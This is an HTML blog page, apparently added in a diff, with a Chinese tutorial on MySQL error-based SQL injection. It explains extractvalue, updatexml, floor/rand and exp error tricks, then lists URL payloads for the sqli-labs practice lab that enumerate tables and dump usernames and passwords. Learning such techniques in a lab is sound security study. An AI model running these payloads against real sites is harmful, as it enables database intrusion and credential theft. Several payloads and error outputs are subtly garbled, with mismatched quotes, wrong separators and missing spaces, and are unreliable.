@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>sql注入之报错注入（精简详细） - 编程中国的博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="sql注入之报错注入（精简详细）" />
+<meta property="og:description" content="报错注入 目录 报错注入常用函数攻击实例 一直对sql注入的报错注入没有系统的整理过，今天整理一遍，方便以后查阅。
+下面的语句可以直接在sql-lab中实践。
+常用函数 extractvalue()
+作用:对XML文档进行查询，相当于在HTML文件中用标签查找元素。
+语法: extractvalue(XML_document, XPath_string )
+参数1: XML_document是String格式，为XML文档对象的名称
+参数2: XPath_string (Xpath格式的字符串)，注入时可操作的地方
+报错原理: xml文档中查找字符位置是用/xxx/xxx/xxx/…这种格式，如果写入其他格式就会报错,并且会返回写入的非法格式内容，错误信息如: XPATH syntax error:‘xxxxxxxx’
+●实例
+mysql&gt; select extractvalue(1,concat(’ ~ &#39;,user()));
+ERROR 1105(HYOO0):XPATH syntax error: &#39;~root@localhost&#34;
+·注:该函数最大显示长度为32，超过长度可以配合substr、limit等函数来显示
+updatexml()
+作用:改变文档中符合条件的节点的值。
+语法: updatexml(XML_document, XPath_string, new_value )
+参数1:XML_document是String格式，为XML文档对象的名称
+参数2:XPath_string (Xpath格式的字符串)，注入时可操作的地方
+参数3: new_value，String格式，替换查找到的符合条件的数据报错原理:同extractvalue()
+●实例
+mysql&gt; select updatexml(1,concat(&#39;~ &#39;,user()).1);
+ERROR1105(HY0O0): XPATH syntax error: ‘~root@localhost’
+·注:该函数最大显示长度为32，超过长度可以配合substr、limit等函数来显示
+floor(),rand(0),count(),group by 联用作用
+floor(x):对参数x向下取整
+rand():生成一个0~1之间的随机浮点数
+count(*):统计某个表下总共有多少条记录
+group by x:按照(by)一定的规则(x)进行分组
+报错原理: group by与rand()使用时，如果临时表中没有该主键，则在插入前会再计算一次rand()，然后再由group by将计算出来的主键直接插入到临时表格中，导致主键重复报错，错误信息如: Duplicate entry ‘…’ for key ‘group_key’。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/88f68ef856fbb4bb37c3b7054146fa5c/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-08-06T10:08:36+08:00" />
+<meta property="article:modified_time" content="2022-08-06T10:08:36+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程中国的博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">sql注入之报错注入（精简详细）</h1>
+			
+		</header>
+		<div id="gatop"></div>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="markdown_views prism-atom-one-dark">
+                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+                    </svg>
+                    <h3><a id="_0"></a>报错注入</h3> 
+<p></p> 
+<div class="toc"> 
+ <h4>目录</h4> 
+ <ul><li><ul><li><a href="#_0" rel="nofollow">报错注入</a></li><li><ul><li><a href="#_8" rel="nofollow">常用函数</a></li><li><a href="#_65" rel="nofollow">攻击实例</a></li></ul> 
+  </li></ul> 
+ </li></ul> 
+</div> 
+<p></p> 
+<p>一直对sql注入的报错注入没有系统的整理过，今天整理一遍，方便以后查阅。<br> 下面的语句可以直接在sql-lab中实践。</p> 
+<h4><a id="_8"></a>常用函数</h4> 
+<p>extractvalue()<br> 作用:对XML文档进行查询，相当于在HTML文件中用标签查找元素。<br> 语法: extractvalue(XML_document, XPath_string )<br> 参数1: XML_document是String格式，为XML文档对象的名称<br> 参数2: XPath_string (Xpath格式的字符串)，注入时可操作的地方<br> 报错原理: xml文档中查找字符位置是用/xxx/xxx/xxx/…这种格式，如果写入其他格式就会报错,并且会返回写入的非法格式内容，错误信息如: XPATH syntax error:‘xxxxxxxx’</p> 
+<p>●实例<br> mysql&gt; select extractvalue(1,concat(’ ~ ',user()));<br> ERROR 1105(HYOO0):XPATH syntax error: '~root@localhost"<br> ·注:该函数最大显示长度为32，超过长度可以配合substr、limit等函数来显示</p> 
+<p>updatexml()<br> 作用:改变文档中符合条件的节点的值。<br> 语法: updatexml(XML_document, XPath_string, new_value )<br> 参数1:XML_document是String格式，为XML文档对象的名称<br> 参数2:XPath_string (Xpath格式的字符串)，注入时可操作的地方<br> 参数3: new_value，String格式，替换查找到的符合条件的数据报错原理:同extractvalue()</p> 
+<p>●实例<br> mysql&gt; select updatexml(1,concat('~ ',user()).1);<br> ERROR1105(HY0O0): XPATH syntax error: ‘~root@localhost’<br> ·注:该函数最大显示长度为32，超过长度可以配合substr、limit等函数来显示</p> 
+<p>floor(),rand(0),count(),group by 联用作用</p> 
+<p>floor(x):对参数x向下取整<br> rand():生成一个0~1之间的随机浮点数<br> count(*):统计某个表下总共有多少条记录<br> group by x:按照(by)一定的规则(x)进行分组</p> 
+<p>报错原理: group by与rand()使用时，如果临时表中没有该主键，则在插入前会再计算一次rand()，然后再由group by将计算出来的主键直接插入到临时表格中，导致主键重复报错，错误信息如: Duplicate entry ‘…’ for key ‘group_key’。</p> 
+<p>●实例<br> select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a;<br> ERROR 1062 (23000): Duplicate entry ‘root@localhost1’ for key ‘group_key’</p> 
+<p>exp() (5.5.5&lt;= MySQL数据库版本号&lt;=5.5.49)<br> 作用:计算以e (自然常数）为底的幂值<br> 语法:exp(x)<br> 报错原理:当参数x超过710时，exp()函数会报错，错误信息如:DOUBLE value is out of range: …</p> 
+<p>●实例<br> mysql&gt; select exp(~(select * from (select user()) as x));<br> ERROR 1690 (22003); DOUBLE value is out of range in 'exp(~((select ‘root@localhost’ from dual)"</p> 
+<h4><a id="_65"></a>攻击实例</h4> 
+<ol><li><strong>extractvalue()</strong></li></ol> 
+<pre><code>?id=-1' and extractvalue(1,concat('~ ",(select database())))--+
+//爆当前数据库的库名，获知当前的数据库名称为security
+
+?id=-1' and extractvalue(1,
+concat('~ ',(select table_name from information_schema.tables where table_schema='security' limit N,1)))--+
+//爆security数据库的表名，通过调整参数N获知security数据库中有一张表名为users
+
+?id=-1' and extractvalue(1,
+concat('~ ",(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit N,1)))--+
+//爆users表中的字段名，通过调整参数N获知users表中包含id,username,password三个字段
+
+?id=-1' and extractvalue(1,concat('~ ',(select concat_ws(';', id,username,password)from security.users limit N,1)))--+
+//通过调整参数N，爆users表中id,username,password三个字段的值
+</code></pre> 
+<p>2.<strong>floor()</strong></p> 
+<pre><code>?id=-1' and (select 1 from (select count(*),.concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+
+//爆当前数据库的库名，获知当前的数据库名称为security
+
+?id=-1' and (select 1 from (select count(*),concat((select table_name frominformation_schema.tables where table_schema='security' limit N,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+
+//爆security数据库的表名，通过调整参数N获知security数据库中有一张表名为users
+
+?id=-1' and (select 1 from (select count(*),concat((select column_name frominformation_schema.columns where table_schema='security' and table_name='users' limit N,1),
+floor(rand(0)*2))x from information_schema.tablesgroup by x)a)--+
+//爆users表中的字段名，通过调整参数N获知users表中包含id,username,password三个字段?
+
+id=-1' and (select 1 from (select count(*),concat((select
+concat_ws( ',',id,username,password) from security.users limit N,1),floor(rand(0)*2)&gt;x from information_schema.tables group by x)a)--+
+//通过调整参数N，爆users表中id,username,password三个字段的值
+</code></pre>
+                </div>
+		</div>
+		<div id="gabottom"></div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/6f31b93a9fd6c2bedd5d1a0500ebbffc/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">游戏滚动列表的优化（降低drawcall从154降低到14，图片大小，界面逻辑）</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/25937a83a457e206503138c5e95cc838/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">谷歌浏览器插件HackBar安装方法（详细教程）</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 编程中国的博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<div id="gafoot"></div>
+<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
+<script src="https://101121.xyz/ga/app.js"></script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
